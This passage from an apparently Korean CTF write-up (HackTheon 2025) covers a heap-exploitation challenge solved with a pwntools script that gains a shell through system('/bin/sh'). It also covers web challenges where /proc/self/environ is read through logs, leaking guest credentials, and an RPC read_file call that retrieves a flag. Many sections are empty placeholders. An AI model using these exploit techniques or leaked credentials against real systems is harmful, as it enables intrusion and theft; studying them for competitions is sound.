여기서 파악할 수 있는 점은 raw_payload를 입력받을 때, 입력한 데이터의 크기가 0x10000을 초과하게 된다면 `g_map` 변수에 할당된 공간을 초과한다는 점입니다. 또한 이 바로 뒤에는 각 chunk마다의 bitmap들이 담겨있는 array가 존재합니다. 즉, 여기서 발생하는 heap buffer overrun을 통해 bitmap의 주소를 조작할 수 있습니다.

```c
void *__fastcall custom_memory_alloc(unsigned int size)
{
  int j; // [rsp+30h] [rbp-20h]
  int i; // [rsp+34h] [rbp-1Ch]
  int v4; // [rsp+38h] [rbp-18h]

  if ( !size || size > 0x1000 )
    return 0LL;
  v4 = -1;
  for ( i = 0; i < 9; ++i )
  {
    if ( size <= CHUNK_SIZES[i] )
    {
      v4 = i;
      break;
    }
  }
  if ( v4 == -1 )
    return 0LL;
  for ( j = 0; j < CHUNK_CNT[v4]; ++j )
  {
    if ( ((1 << (j % 8)) & BITMAPS[v4][j / 8]) == 0 )
    {
      BITMAPS[v4][j / 8] |= 1 << (j % 8);
      return (j * CHUNK_SIZES[v4] + CHUNK_MAPS[v4]);
    }
  }
  return 0LL;
}

unsigned __int64 __fastcall custom_free(head_node *a1)
{
  int v2; // [rsp+Ch] [rbp-34h]
  unsigned __int64 v3; // [rsp+20h] [rbp-20h]
  int i; // [rsp+2Ch] [rbp-14h]

  if ( a1 )
  {
    for ( i = 0; i < 9; ++i )
    {
      v3 = CHUNK_MAPS[i];
      if ( a1 >= v3 && a1 < CHUNK_CNT[i] * CHUNK_SIZES[i] + v3 )
      {
        v2 = (a1 - v3) / CHUNK_SIZES[i];
        BITMAPS[i][v2 / 8] &= ~(1 << (v2 % 8));
        return __readfsqword(0x28u);
      }
    }
  }
  return __readfsqword(0x28u);
}
```

또한, 할당 및 해제 방식을 보면, size에 맞는 index의 bitmap을 순회하여 해제하고 할당하는 것을 확인할 수 있습니다. 따라서, bitmap의 주소를 조작하면 다른 특정 size의 힙 layout에 대하여 **할당/해제 여부를 조작할 수 있습니다.**

```C
__int64 __fastcall save_data(raw_data *a1, data *a2)
{
  int v2; // ecx
  int v3; // ecx
  char *addr; // [rsp+8h] [rbp-38h]
  int total_size; // [rsp+14h] [rbp-2Ch]
  int v7; // [rsp+14h] [rbp-2Ch]
  int v8; // [rsp+14h] [rbp-2Ch]

  total_size = a1->total_size;
  if ( (a2->contents_len + a2->name + a1->total_size) <= 0xFFF )
  {
    if ( memchr(a2->name_len, ',', a2->name) || memchr(a2->contents, ',', a2->contents_len) )
    {
      return -1879048188;
    }
    else
    {
      addr = get_addr(a1->buf);
      v2 = total_size;
      v7 = total_size + 1;
      addr[v2] = ',';
      memcpy(&addr[v7], a2->name_len, a2->name);
      v3 = v7 + a2->name;
      v8 = v3 + 1;
      addr[v3] = '=';
      memcpy(&addr[v3 + 1], a2->contents, a2->contents_len);
      a1->total_size = v8 + a2->contents_len;
      return 0;
    }
  }
  else
  {
    return -1879048191;
  }
}
```

또한 instruction 4번에 해당하는 기능을 수행하면 function table을 타고 들어가 위 함수가 실행됩니다.

```c
__int64 __fastcall vm_obj_constructor(int a1)
{
  object *obj; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+18h] [rbp-18h]
  int idx; // [rsp+1Ch] [rbp-14h]

  idx = get_obj();
  if ( idx >= 0 )
  {
    obj = custom_memory_alloc(0x18u);
    if ( obj )
    {
      if ( a1 )
      {
        if ( a1 != 1 )
          return 0x90000003;
        obj->ftable = &off_6010;
      }
      else
      {
        obj->ftable = &off_6030;
      }
      v3 = (*obj->ftable)(&obj->raw_data);  //call alloc_data if obj type(a1) == 0 
      if ( v3 >= 0 )
      {
        g_obj_list[idx] = obj;
        return idx;
      }
      else
      {
        custom_free(obj);
        return v3;
      }
    }
    else
    {
      return 0x90000000;
    }
  }
  else
  {
    return idx;
  }
}

__int64 __fastcall alloc_data(raw_data **a1)
{
  void *s; // [rsp+10h] [rbp-30h]
  raw_data *v3; // [rsp+18h] [rbp-28h]

  v3 = custom_memory_alloc(0x10u);
  if ( v3 && (s = custom_memory_alloc(0x1000u)) != 0LL )
  {
    memset(s, 0, 0x1000uLL);
    v3->buf = s;
    v3->total_size = 0;
    *a1 = v3;
    return 0;
  }
  else
  {
    if ( v3 )
      custom_free(v3);
    return -1879048192;
  }
}
```

그러나, object를 할당할 때, data를 할당하는 걸 보면, `0x1000`의 크기로 공간을 할당합니다. 때문에 `save_data`함수의 `','`, `'='`를 삽입하는 로직에 의해 `0xfff`의 size 제한이 있음에도 불구하고 1bytes의 overflow가 발생합니다.

mmap으로 할당된 chunk들은 header 등의 데이터 정보 없이 바로 뒤에 다음으로 할당된 chunk가 배치되므로, 뒤 chunk의 1byte를 overwrite할 수 있는 것입니다.

```c
__int64 __fastcall vm_enqueue_data(char *buf, unsigned int size)
{
  unsigned int v3; // [rsp+8h] [rbp-48h]
  unsigned int v4; // [rsp+10h] [rbp-40h]
  unsigned int n; // [rsp+1Ch] [rbp-34h]
  node *next; // [rsp+20h] [rbp-30h]
  head_node *node_chain; // [rsp+28h] [rbp-28h]
  unsigned int sze; // [rsp+34h] [rbp-1Ch]
  char *src; // [rsp+38h] [rbp-18h]

  src = buf;
  sze = size;
  if ( size )
  {
    node_chain = create_node_chain(size);
    if ( node_chain )
    {
      node_chain->total_size = size;
      if ( size >= 0xFF0uLL )
        v4 = 0xFF0;
      else
        v4 = size;
      n = v4;                                   // Copy data to first node (max 4080 bytes)
      memcpy(node_chain->buffer, buf, v4);
      for ( next = node_chain->next; next; next = next->next )// Copy remaining data to linked nodes (max 4088 bytes each)
      {
        sze -= n;
        src += n;
        if ( sze >= 0xFF8uLL )
          v3 = 0xFF8;
        else
          v3 = sze;
        n = v3;
        memcpy(next->buffer, src, v3);
      }
      return add_to_queue(node_chain);          // Add node chain to queue and return result
    }
    else
    {
      return 0x80000003;                        // Return 0x80000003 if node chain creation failed
    }
  }
  else
  {
    return 0x80000004;                          // Return 0x80000004 if size is 0
  }
}

head_node *__fastcall create_node_chain(unsigned int a1)
{
  int v2; // [rsp+8h] [rbp-48h]
  unsigned int v3; // [rsp+10h] [rbp-40h]
  node *next; // [rsp+18h] [rbp-38h]
  head_node *first_node; // [rsp+20h] [rbp-30h]
  head_node *v6; // [rsp+28h] [rbp-28h]
  unsigned int v7; // [rsp+3Ch] [rbp-14h]

  if ( a1 >= 0xFF0uLL )
    v3 = 0xFF0;
  else
    v3 = a1;
  first_node = custom_memory_alloc(v3 + 0x10);
  if ( first_node )
  {
    v7 = a1 - v3;
    v6 = first_node;
    while ( v7 )
    {
      if ( v7 >= 0xFF8uLL )
        v2 = 0xFF8;
      else
        v2 = v7;
      next = custom_memory_alloc(v2 + 8);
      if ( !next )
        goto LABEL_13;
      v6->next = next;
      next->next = 0LL;
      v6 = next;
      v7 -= v2;
    }
    return first_node;
  }
  else
  {
LABEL_13:
    free_node_chain(first_node);
    return 0LL;
  }
}

__int64 __fastcall vm_reassemble_data_from_queue(void **ptr)
{
  unsigned int next_chunk_size; // [rsp+10h] [rbp-50h]
  bool has_more_data; // [rsp+1Fh] [rbp-41h]
  unsigned int current_chunk_size; // [rsp+20h] [rbp-40h]
  char *dest; // [rsp+28h] [rbp-38h]
  unsigned int total_size; // [rsp+30h] [rbp-30h]
  unsigned int chunk_size; // [rsp+34h] [rbp-2Ch]
  node *current_node; // [rsp+38h] [rbp-28h]
  head_node *node; // [rsp+40h] [rbp-20h]

  node = dequeue();
  if ( node )
  {
    total_size = node->total_size;
    *ptr = malloc(total_size);
    if ( total_size >= 0xFF0uLL )
      current_chunk_size = 0xFF0;
    else
      current_chunk_size = total_size;
    chunk_size = current_chunk_size;
    memcpy(*ptr, node->buffer, current_chunk_size);
    dest = *ptr;
    for ( current_node = get_addr(node->next); ; current_node = get_addr(current_node->next) )
    {
      has_more_data = 0;
      if ( current_node )
        has_more_data = total_size != 0;
      if ( !has_more_data )
        break;
      total_size -= chunk_size;
      dest += chunk_size;
      if ( total_size >= 0xFF8uLL )
        next_chunk_size = 4088;
      else
        next_chunk_size = total_size;
      chunk_size = next_chunk_size;
      memcpy(dest, current_node->buffer, next_chunk_size);
    }
    free_node_chain(node);
    return node->total_size;
  }
  else
  {
    return 0x80000001;
  }
}
```

또한 문제에서는 1, 2번 instrction을 통해서 data를 enqueue하거나 dequeue할 수 있습니다. 

이 때 data와 header를 포함한 크기가 0x1000을 넘어가면 이 data를 node로 연결하는 구조로 코드가 작성돼있습니다. 이 때 first node와 이후 연결되는 node는 구조가 조금 다른데, first node에 total size를 기록하여 이후 연결되는 node에는 따로 size를 기록하지 않습니다.

위 기능을 통해 0x1000의 크기로 node를 할당할 수 있으며. 첫 멤버변수로 next node pointer를 가지는 것을 제외하면 모두 data buffer를 갖는(즉, size 기록이 없는) node도 생성할 수 있습니다.

앞서 이야기한 두 취약점과 기능들을 토대로 아래와 같은 exploit scenario를 짜서 exploit 할 수 있습니다.

1. 0번 type의 object를 생성
2. 1번 instruction을 활용해 0x1000보다 큰 크기의 아무 data를 enqueue하여 `node A -> node B` 형태의 구조를 생성.
3. `save_data` 기능에서 발생하는 1byte overflow를 통하여 2번 step에서 생성한 `node A`의 next pointer를 변조
4. `reassemble_data_from_queue` 기능은 next pointer를 참조하여 버퍼를 연결하여 출력하므로, 적절하게 data를 저장하여 node의 pointer(mmap 영역)를 leak. => libc leak.
5. object를 생성 (0x18bytes)
6. `size <= 0x10`인 node를 생성
7. `size <= 0x10`인 bitmap의 주소를 `size <= 0x20`인 bitmap의 주소로 조작
8. `reassemble_data_from_queue`를 호출하여 `size <= 0x20`인 bitmap에 존재하는 object가 할당 해제된 것으로 조작.
9. bitmap을 원래대로 되돌리고, size기록이 없는 node를 통해 UAF를 유발하여 구조체를 적절히 조작. 
10. 해당 object를 destruct할 때의 인자와 ftable을 적절히 조절할 수 있으므로 `system("/bin/sh")`를 호출하여 shell 획득!

##### ex.py
```py
from pwn import *

e = ELF('./storage')
# p = e.process()
p = remote('0', 34284)

ENQUEUE     = 1
REASSEMBLE  = 2
CREATE      = 3
SAVE        = 4
LOAD        = 5
DELETE      = 6

def send_packet(inst: int, cnt: int, bufs: list) -> None:
    szes = [len(buf) for buf in bufs]
    p.send(p32(inst) + p32(cnt))
    for i in range(cnt):
        p.send(p16(szes[i]))
        # for j in range(szes[i]):
        #     p.send(bufs[i][j])
        p.send(bufs[i])

def enqueue_data(buf: bytes) -> None:
    send_packet(ENQUEUE, 1, [buf])

def reassemble_data() -> None: 
    send_packet(REASSEMBLE, 0, [])

def create_obj(obj_type: int) -> None:
    send_packet(CREATE, 1, [p32(obj_type)])

def save_data(obj_idx: int, name: bytes, content: bytes) -> None:
    send_packet(SAVE, 3, [p32(obj_idx), name, content])

def load_data(obj_idx: int) -> None:
    send_packet(LOAD, 1, [p32(obj_idx)])

def delete_obj(obj_idx: int) -> None:
    send_packet(DELETE, 1, [p32(obj_idx)])

def bitmap_overwrap(buf: bytes) -> None:
    save_data(0x111, b'A'*0xffee, p64(0) + p64(0x51) + buf)

create_obj(0)
d1 = b'A'*0xff0
d2 = b'\0'*0xf8 + b'B'*0xf00
d3 = b'C'
enqueue_data(d1+d2)
enqueue_data(d1+d3)
# pause()
save_data(0, b'A', b'B')
# pause()
save_data(0, b'A'*0xf0c, b'B'*0xee + b'\xf0')
load_data(0)
reassemble_data()
p.recvuntil(b'42'*0xf00)

mmap_leak   = u64(eval(b'p64(0x%s)'%p.recv(12))[::-1]) // 0x10000 - 0x10
libc        = mmap_leak + 0x43000
system      = libc + 0x50d70
binsh       = libc + 0x1d8678

log.info('[MMAP]  %#x'%mmap_leak)
log.info('[GLIBC] %#x'%libc)
reassemble_data()
delete_obj(0)
p.recvuntil(b'result : 0\n')
enqueue_data(d1+d3)
p.recvuntil(b'result : 0\n')
create_obj(0)
p.recvuntil(b'result : 0\n')
bitmap_overwrap(b'\x20')
reassemble_data()
pay = p64(mmap_leak + 0x410) + p64(binsh) + p64(system)
enqueue_data(d1+pay)
p.recvuntil(b'result : 0\n')
delete_obj(0)
p.interactive()
```

#### contract


### Rev
#### revchall-1

##### ex.py
```py
```

#### revchall-2

##### ex.py
```py
```

#### revchall-3

##### ex.py
```py
```

### Web
#### frontdoor-1
```rs
// part of main.rs
#[tokio::main]
async fn main() -> std::result::Result<(), anyhow::Error> {
    let (backend_host, backend_port) = get_host_port();

    let log_path = PathBuf::from(consts::LOG_DIR).join(consts::LOG_FILE);
    if log_path.exists() {
        if let Err(err) = tokio::fs::remove_file(log_path).await {
            tracing::error!("Failed to remove log file: {}", err);
        }
    }

    let file_appender =
        RollingFileAppender::new(Rotation::NEVER, consts::LOG_DIR, consts::LOG_FILE);
    let (non_blocking, _guard) = tracing_appender::non_blocking(file_appender);
    tracing_subscriber::fmt()
        .with_writer(non_blocking)
        .with_ansi(false)
        .with_env_filter(EnvFilter::new("backend=DEBUG"))
        .init();

    let session_store = MemoryStore::default();
    let session_layer = SessionManagerLayer::new(session_store)
        .with_secure(false)
        .with_http_only(false);

    let app = Router::new()
        .route("/api", get(handlers::get_root_handler))
        .route("/api/health-check", get(handlers::get_health_check_handler))
        .route("/api/logs", get(handlers::get_logs_handler))
        .route("/api/monitor/{info}", get(handlers::get_monitor_handler))
        .route("/api/signin", post(handlers::post_signin_handler))
        .route(
            "/api/flag",
            get(handlers::get_flag_handler).layer(middleware::from_fn(middlewares::authorize)),
        )
        .layer(middleware::from_fn(middlewares::tracing_session_id))
        .layer(middleware::from_fn(middlewares::set_session_expiry))
        .layer(session_layer);

    let addr = SocketAddr::from((backend_host, backend_port));
    tracing::info!("Backend running on {:?}", addr);

    let listener = tokio::net::TcpListener::bind(&addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}

// flag.rs
use axum::{http::StatusCode, response::IntoResponse};
use tokio::fs;

pub async fn get_flag_handler() -> impl IntoResponse {
    match fs::read_to_string("flag").await {
        Ok(content) => (StatusCode::OK, content).into_response(),
        Err(err) => {
            tracing::error!("Failed to read flag file: {}", err);
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "Failed to retrieve flag".to_string(),
            )
                .into_response()
        }
    }
}

```

main함수를 보면, `/api/flag`로 요청을 보냈을 때, 권한이 인증된 유저라면 `get_flag_handler` 함수를 통해 flag를 획득할 수 있음을 알 수 있습니다. 그러나 로그인할 수 있는 user의 id 및 password는 서버의 환경변수에 임의의 값으로 저장되어있어 로그인을 할 수 없습니다.

취약점은 monitor 기능에 존재했습니다.

```rs
pub async fn get_monitor_handler(Path(info): Path<String>) -> impl IntoResponse {
    let file_path = match PathBuf::from("/proc")
        .join(alias(&info).unwrap_or(info.clone()))
        .canonicalize()
    {
        Ok(path) => path,
        Err(e) => {
            tracing::error!("Error canonicalizing path: {}", e);
            return (StatusCode::BAD_REQUEST, "Invalid parameter").into_response();
        }
    };

    let is_in_proc = file_path.starts_with("/proc");
    let is_file = file_path.is_file();

    if !is_in_proc || !is_file {
        return (StatusCode::BAD_REQUEST, "Invalid argument").into_response();
    }

    let comps: Vec<_> = file_path.components().collect();
    if comps.len() > 4 {
        return (StatusCode::BAD_REQUEST, "Invalid argument").into_response();
    }

    if comps.len() == 4
        && comps.get(2) != Some(&Component::Normal(OsStr::new(&process::id().to_string())))
    {
        return (StatusCode::BAD_REQUEST, "Invalid argument").into_response();
    }

    let msg = match fs::read_to_string(&file_path).await {
        Ok(content) => parse_content(&info, &content).await,
        Err(err) => {
            tracing::error!("Failed to read file '{}': {}", file_path.display(), err);
            return (StatusCode::BAD_REQUEST, "Invalid argument").into_response();
        }
    };

    (StatusCode::OK, msg).into_response()
}
```

해당 기능은 인자로 넘겨받은 info를 `/proc`라는 경로 뒤에 이어붙여 해당 파일을 읽어들이는 것을 알 수 있습니다. 파일을 정상적으로 읽었다면 `parse_content` 함수를 통해 파일을 parsing합니다.

```rs
async fn parse_content(info: &str, content: &str) -> String {
    match info {
        "uptime" => parse_uptime(content),
        "idle-time" => parse_idle_time(content),
        "cpu" => parse_cpu(content),
        "mem" => parse_mem(content),
        _ => {
            tracing::warn!("Unknown info type: '{}', content '{}'", info, content);
            String::new()
        }
    }
}
```

이때, 정해진 4개의 whitelist 바깥의 값을 입력한다면 오류를 발생시키고 해당 오류를 파일 경로, 내용과 함께 logging합니다. 그러나 이 log는 `log`기능에서 그냥 읽어올 수 있습니다.

즉, `monitor`기능을 이용하여 `/proc/self/environ`을 읽어오도록 요청하고, 적절히 log level을 맞춰서 log를 받아오는 requests를 요청하면 환경변수를 읽어와서 user로 login하여 flag를 획득할 수 있습니다.

##### ex.py
```py
import requests

# url = 'http://localhost:8080/'
url = 'http://hacktheon2025-challs-alb-1354048441.ap-northeast-2.elb.amazonaws.com:58709/'


'''
GUEST_ID=s3cre7Guest1
BACKEND_PORT=3000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GUEST_PWD=G#3stAcc3ss!25
PWD=/app
'''
GUEST_ID='s3cre7Guest1'
GUEST_PWD='G#3stAcc3ss!25'


headers = {'Content-Type': 'application/json'}
# data = {'username':'guest', 'password': 'guest'}
data = {'username':GUEST_ID, 'password': GUEST_PWD}

levels = ['error', 'warn', 'info', 'debug', '']

session = requests.Session()

# #stage 1
# res = session.get(url + f'api/monitor/self%2fenviron')
# print(res.status_code)
# print(res.text)
# res = session.get(url + f'api/logs?level={levels[3]}')
# print(res.status_code)
# print(res.text)

#stage 2
# res = session.post(url + 'api/signin', headers=headers, json=data)
# print(res.status_code)
# print(res.text)
# res = session.get(url + 'api/flag')
# print(res.status_code)
# print(res.text)
```

#### frontdoor-2

```rs
#[tokio::main]
async fn main() -> std::result::Result<(), anyhow::Error> {
    let (backend_host, backend_port) = get_host_port();

    let log_path = PathBuf::from(consts::LOG_DIR).join(consts::LOG_FILE);
    if log_path.exists() {
        if let Err(err) = tokio::fs::remove_file(log_path).await {
            tracing::error!("Failed to remove log file: {}", err);
        }
    }

    let file_appender =
        RollingFileAppender::new(Rotation::NEVER, consts::LOG_DIR, consts::LOG_FILE);
    let (non_blocking, _guard) = tracing_appender::non_blocking(file_appender);
    tracing_subscriber::fmt()
        .with_writer(non_blocking)
        .with_ansi(false)
        .with_env_filter(EnvFilter::new("backend=DEBUG"))
        .init();

    let state = Arc::new(AppState {
        dev_tools_mutex: Mutex::new(()),
    });

    let session_store = MemoryStore::default();
    let session_layer = SessionManagerLayer::new(session_store)
        .with_secure(false)
        .with_http_only(false);

    let app = Router::new()
        .route("/api", get(handlers::get_root_handler))
        .route("/api/health-check", get(handlers::get_health_check_handler))
        .route("/api/logs", get(handlers::get_logs_handler))
        .route("/api/monitor/{info}", get(handlers::get_monitor_handler))
        .route("/api/signin", post(handlers::post_signin_handler))
        .route(
            "/api/rpc",
            post(handlers::post_rpc_handler)
                .layer(middleware::from_fn_with_state(
                    state.clone(),
                    middlewares::ensure_dev_tools,
                ))
                .layer(middleware::from_fn(authenticate)),
        )
        .layer(middleware::from_fn(middlewares::tracing_session_id))
        .layer(middleware::from_fn(middlewares::set_session_expiry))
        .layer(session_layer)
        .with_state(state);

    let addr = SocketAddr::from((backend_host, backend_port));
    tracing::info!("Backend running on {:?}", addr);

    let listener = tokio::net::TcpListener::bind(&addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}

```
전체적으로 frontdoor-1 문제와 코드는 유사하지만, flag기능이 사라지고 rpc 기능이 새로 도입됐습니다.

```rs
#[derive(Deserialize, Serialize)]
pub struct PostRpcBody {
    method: String,
    params: Vec<Parameter>,
}

async fn append_session_dir(session: &Session, body: &mut PostRpcBody) -> bool {
    let dir = match session.get::<PathBuf>("dir").await {
        Ok(Some(dir)) => dir,
        _ => return false,
    };

    let method = body.method.as_str();
    if method == "close" || method == "read" || method == "write" || method == "exit" {
        return true;
    }

    if body.params.is_empty() || body.params[0].param_type != 1 {
        return false;
    }

    let path = match &body.params[0].value {
        ParameterValue::Int(_) => return false,
        ParameterValue::Str(s) => dir.join(s),
    };

    if !path.is_absolute() || path.is_symlink() {
        return false;
    }

    body.params[0].value = ParameterValue::Str(path.to_str().unwrap().to_string());

    true
}

pub async fn post_rpc_handler(
    session: Session,
    Json(mut body): Json<PostRpcBody>,
) -> impl IntoResponse {
    let port = match session.get::<u16>("port").await {
        Ok(Some(port)) => port,
        _ => {
            tracing::error!("Failed to get port");
            return (StatusCode::INTERNAL_SERVER_ERROR, "Failed to call RPC").into_response();
        }
    };

    if !append_session_dir(&session, &mut body).await {
        tracing::error!("Failed to append session dir");
        return (StatusCode::INTERNAL_SERVER_ERROR, "Failed to call RPC").into_response();
    }

    let mut stream = match TcpStream::connect(format!("127.0.0.1:{}", port)).await {
        Ok(stream) => stream,
        Err(err) => {
            tracing::error!("Failed to connect dev_tools: {}", err);
            return (StatusCode::INTERNAL_SERVER_ERROR, "Failed to call RPC").into_response();
        }
    };

    let json_data = serde_json::to_string(&body).unwrap();

    if let Err(err) = stream.write_all(json_data.as_bytes()).await {
        tracing::error!("Failed to send data: {}", err);
        return (StatusCode::INTERNAL_SERVER_ERROR, "Failed to call RPC").into_response();
    };

    let mut buffer = Vec::new();
    if let Err(err) = stream.read_to_end(&mut buffer).await {
        tracing::error!("Failed to receive data: {}", err);
        return (StatusCode::INTERNAL_SERVER_ERROR, "Failed to call RPC").into_response();
    }

    let resp = match String::from_utf8(buffer) {
        Ok(resp) => resp,
        Err(err) => {
            tracing::error!("Failed to convert response: {}", err);
            return (StatusCode::INTERNAL_SERVER_ERROR, "Failed to call RPC").into_response();
        }
    };

    (StatusCode::OK, resp).into_response()
}
```

기능을 살펴보면, `close`, `read`, `write`, `exit` 메서드를 제외한 다른 메서드라면 session에 저장한 후 `dev_tools` 기능으로 호출합니다.

허나 여기서 file io에 관련한 모든 기능을 제한한 것처럼 보이지만 `dev_tools`에는 `read_file`이라는 메서드 또한 존재합니다(...). 때문에 해당 메서드를 이용하면 단순히 request를 전송하는 것만으로도 frontdoor-1 문제와 유사하게 flag를 획득할 수 있습니다. (Unintended solution으로 예상됩니다.) 

##### ex.py
```py
import requests

# url = 'http://localhost:8080/'
url = 'http://hacktheon2025-challs-alb-1354048441.ap-northeast-2.elb.amazonaws.com:42527/'


'''
GUEST_ID=s3cre7Guest1
BACKEND_PORT=3000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GUEST_PWD=G#3stAcc3ss!25
PWD=/app
'''
GUEST_ID='s3cre7Guest1'
GUEST_PWD='G#3stAcc3ss!25'

levels = ['error', 'warn', 'info', 'debug', '']

session = requests.Session()

# #stage 1
# res = session.get(url + f'api/monitor/self%2fenviron')
# print(res.status_code)
# print(res.text)
# res = session.get(url + f'api/logs?level={levels[3]}')
# print(res.status_code)
# print(res.text)

# #stage 2
headers = {'Content-Type': 'application/json'}
# data = {'username':'guest', 'password': 'guest'}
data = {'username':GUEST_ID, 'password': GUEST_PWD}

res = session.post(url + 'api/signin', headers=headers, json=data)
print(res.status_code)
print(res.text)

rpc_data = {"method":"read_file","params":[{"type":1,"value":"/app/flag"}]}
res = session.post(url + 'api/rpc', headers=headers, json=rpc_data)
print(res.status_code)
print(res.text)
```

#### web-chall1

#### web-chall2

### Crypto

#### crypto-chall1

##### ex.py
```py
```

#### crypto-chall2

##### ex.py
```py
```

#### crypto-chall3

##### ex.py
```py
```

### Forensic

#### forensic-chall1

##### ex.py
```py
```

#### forensic-chall2

##### ex.py
```py
```

#### forensic-chall3

##### ex.py
```py
```

### Misc

#### hidden message

문제 파일을 압축 해제하면 아래의 사진이 제공됩니다.

![hidden_message](../assets/img/2025_hacktheon_writeup/Hidden%20message.png)

사진 하나만 제공되는 것을 토대로, 이 문제가 steganography형식의 문제임을 짐작할 수 있습니다. 

가장 유력한 lsb 혹은 msb에 데이터를 숨겨놓았을 거라고 생각해 stegsolve 툴을 이용하여 데이터를 확인해보았습니다.

![msb](../assets/img/2025_hacktheon_writeup/msb.png)

그러자 또 다른 png파일을 숨겨놓은 것을 확인할 수 있었고, 해당 파일을 열어보면...

![flag](../assets/img/2025_hacktheon_writeup/hm_flag.png)

이렇게 flag를 획득할 수 있습니다.

##### ex.py
```py
```

#### misc-chall2

##### ex.py
```py
```

#### misc-chall3

##### ex.py
```py
```